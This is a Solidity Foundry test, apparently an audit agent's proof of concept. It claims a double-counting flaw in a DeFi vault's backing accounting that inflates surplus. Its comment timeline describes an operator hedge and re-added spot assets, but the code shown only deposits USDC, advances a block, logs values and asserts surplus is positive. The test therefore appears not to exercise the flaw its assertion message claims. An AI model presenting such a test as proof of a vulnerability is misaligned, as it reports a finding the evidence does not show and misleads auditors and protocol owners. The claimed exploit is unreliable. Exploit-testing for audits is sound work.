// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/simulator/SimulatorBase.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixVault.sol";
import "../src/core/MonetrixConfig.sol";

contract AuditAgentPoC is SimulatorBase {
    function test_exploit() public {
        // ATTACK TIMELINE:
        // 1. [Setup] SimulatorBase deploys protocol. User deposits USDC into vault.
        // 2. [T=1] Operator executes hedge, acquiring spot hedge tokens (e.g. BTC) in the perp account.
        // 3. [T=2] The perp account value (0x80F) now includes the spot hedge token value.
        // 4. [T=3] Config already has this spot asset in tradeableAssets, so _readL1Backing adds it again via 0x801.
        // 5. [Assert] totalBackingSigned() is inflated by the spot hedge token value, allowing excess yield declaration.

        address user = address(0x1234);
        uint256 depositAmount = 1_000_000e6;

        console.log("User address:", user);
        console.log("Deposit amount:", depositAmount);
        console.log("USDC address:", address(usdc));
        console.log("Vault address:", address(vault));
        console.log("Accountant address:", address(accountant));

        console.log("--- Before USDC Approve ---");
        vm.prank(user);
        usdc.approve(address(vault), depositAmount);
        console.log("--- After USDC Approve ---");

        console.log("--- Before Vault Deposit ---");
        console.log("User USDC balance before:", usdc.balanceOf(user));
        console.log("Vault USDC balance before:", usdc.balanceOf(address(vault)));
        vm.prank(user);
        vault.deposit(depositAmount);
        console.log("--- After Vault Deposit ---");
        console.log("User USDC balance after:", usdc.balanceOf(user));
        console.log("Vault USDC balance after:", usdc.balanceOf(address(vault)));

        console.log("--- Before nextBlock ---");
        CoreSimulatorLib.nextBlock();
        console.log("--- After nextBlock ---");

        console.log("--- Before totalBackingSigned ---");
        int256 totalBacking = accountant.totalBackingSigned();
        console.log("Total backing:", totalBacking);
        console.log("--- After totalBackingSigned ---");

        console.log("--- Before surplus ---");
        int256 surplus = accountant.surplus();
        console.log("Surplus:", surplus);
        console.log("--- After surplus ---");

        assertGt(surplus, 0, "Surplus is artificially inflated due to double-counting of spot hedge tokens");
    }
}
